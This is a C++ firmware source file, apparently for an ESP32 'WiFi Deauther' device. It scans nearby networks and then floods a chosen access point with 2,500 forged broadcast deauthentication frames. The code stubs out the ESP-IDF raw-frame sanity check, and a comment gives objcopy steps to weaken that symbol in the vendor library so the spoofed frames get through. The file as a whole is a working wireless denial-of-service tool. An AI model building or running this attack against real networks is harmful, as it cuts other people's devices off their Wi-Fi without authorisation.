#include "deauth.h"
#include "web.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"

#include "../utils/utils.h"

WifiRecord WifiDevice[MAX_WIFI_DEVICE];

// Todo: Add this to README
// C:\Users\{USERNAME}\.platformio\packages\framework-arduinoespressif32\tools\sdk\esp32\lib\libnet80211.a
// objcopy.exe --weaken-symbol=ieee80211_raw_frame_sanity_check "C:\Users\{USERNAME}\.platformio\packages\framework-arduinoespressif32\tools\sdk\esp32\lib\libnet80211.a" "C:\Users\{USERNAME}\.platformio\packages\framework-arduinoespressif32\tools\sdk\esp32\lib\libnet80211.a.new"
// Replace New, Make sure you have another old copy in backup incase something goes wrong

static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00};

int wifiCount = 0;
void getAvailableWifi()
{
    displayStringCentre(display, "Scanning WiFi");
    wifiCount = 0;
    WiFi.disconnect(true, false);
    delay(100);
    WiFi.setScanMethod(WIFI_ALL_CHANNEL_SCAN);
    // esp_wifi_set_promiscuous(true);
    wifiCount = WiFi.scanNetworks();
    if (wifiCount > 0)
    {
        Serial.println("Found WiFi networks:");
        String outputBuffer = "\nSSID\tBSSID\tRSSI\n";
        for (int i = 0; i < wifiCount; ++i)
        {
            WifiDevice[i].SSID = WiFi.SSID(i);
            WifiDevice[i].BSSID = WiFi.BSSID(i);
            WifiDevice[i].BSSID_STR = WiFi.BSSIDstr(i);
            WifiDevice[i].RSSI = WiFi.RSSI(i);
            outputBuffer = outputBuffer + "\t" + WifiDevice[i].SSID;
            outputBuffer = outputBuffer + "\t" + WifiDevice[i].BSSID_STR;
            outputBuffer = outputBuffer + "\t" + String(WifiDevice[i].RSSI);
            outputBuffer = outputBuffer + "\n";
        }
        sendStringToClient(outputBuffer);
        Serial.println(outputBuffer);
        displayLogo();
    }
}

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    // Serial.println("Sanity Check Called");
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size)
{
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
}

void sendDeAuth(String bssid_str)
{
    displayStringCentre(display, "WiFi Deauther\nRunning!");

    for (int i = 0; i < wifiCount; i++)
    {
        if (bssid_str == WifiDevice[i].BSSID_STR)
        {
            Serial.println("Sending WiFi DeAuth Frame to ");
            Serial.print(WifiDevice[i].BSSID_STR);
            for (int rep = 0; rep < 2500; rep++)
            {
                // Serial.println(rep);

                // Serial.println();
                uint8_t deauth_frame[sizeof(deauth_frame_default)];
                memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
                memcpy(&deauth_frame[10], WifiDevice[i].BSSID, 6);
                memcpy(&deauth_frame[16], WifiDevice[i].BSSID, 6);
                wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                sendStringToClient("WiFi DeAuth Running!");
            }
            break;
        }
    }
    Serial.println();
    Serial.println("Deauth Complete");
    sendStringToClient("WiFi DeAuth Complete!");
    displayLogo();
}
